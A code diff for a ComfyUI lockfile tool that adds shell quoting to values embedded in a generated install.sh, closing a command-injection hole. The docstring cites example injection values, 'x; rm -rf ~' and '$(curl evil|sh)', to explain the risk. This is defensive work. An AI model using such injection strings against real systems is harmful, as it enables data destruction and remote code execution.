@@ -7,8 +7,25 @@ the output -- it is a portable bootstrap for a locked ComfyUI environment.
 
 from __future__ import annotations
 
+import shlex
+
 from .. import __version__
 from ..model import Lockfile
+
+
+def _q(value: object) -> str:
+    """POSIX-shell-quote an untrusted lockfile value before embedding it.
+
+    A lockfile is shared, third-party input: its git URLs, commits, model URLs,
+    paths and hashes are read verbatim with no validation (see ``model.from_dict``).
+    The generated ``install.sh`` is meant to be *executed*, so embedding any of
+    those values unquoted turns a malicious lock into arbitrary code execution on
+    whoever runs the script -- e.g. a ``comfyui`` commit of ``x; rm -rf ~`` or a
+    model url of ``$(curl evil|sh)`` would run. ``shlex.quote`` renders every value
+    as a single inert argument (single-quoted, embedded quotes escaped), so git/
+    curl/sha256sum only ever see data, never extra commands.
+    """
+    return shlex.quote(str(value))
 
 
 def _node_name(url: str) -> str:
@@ -41,7 +58,7 @@ def to_shell(lock: Lockfile) -> str:
 
     if lock.comfyui:
         out.append("# Pin ComfyUI core to the locked commit")
-        out.append(f"git fetch --all && git checkout {lock.comfyui}")
+        out.append(f"git fetch --all && git checkout {_q(lock.comfyui)}")
         out.append("")
 
     if lock.git_nodes:
@@ -49,8 +66,12 @@ def to_shell(lock: Lockfile) -> str:
         out.append('mkdir -p custom_nodes && cd custom_nodes')
         for url, commit in sorted(lock.git_nodes.items()):
             name = _node_name(url)
-            out.append(f'if [ ! -d "{name}" ]; then git clone "{url}" "{name}"; fi')
-            out.append(f'( cd "{name}" && git fetch --all && git checkout {commit} )')
+            out.append(
+                f"if [ ! -d {_q(name)} ]; then git clone {_q(url)} {_q(name)}; fi"
+            )
+            out.append(
+                f"( cd {_q(name)} && git fetch --all && git checkout {_q(commit)} )"
+            )
         out.append('cd "$ROOT"')
         out.append("")
 
@@ -61,13 +82,14 @@ def to_shell(lock: Lockfile) -> str:
             sha = m.hash_of("SHA256")
             if not m.url:
                 out.append(
-                    f'echo "WARN: no download URL for {m.name}; '
-                    f'place it at {dest} manually"'
+                    "echo "
+                    + _q(f"WARN: no download URL for {m.name}; "
+                         f"place it at {dest} manually")
                 )
                 continue
-            out.append(f'dl "{m.url}" "{dest}"')
+            out.append(f"dl {_q(m.url)} {_q(dest)}")
             if sha:
-                out.append(f'echo "{sha}  {dest}" | sha256sum -c -')
+                out.append(f"echo {_q(f'{sha}  {dest}')} | sha256sum -c -")
         out.append("")
 
     out.append('echo "ComfyLock: environment restored."')
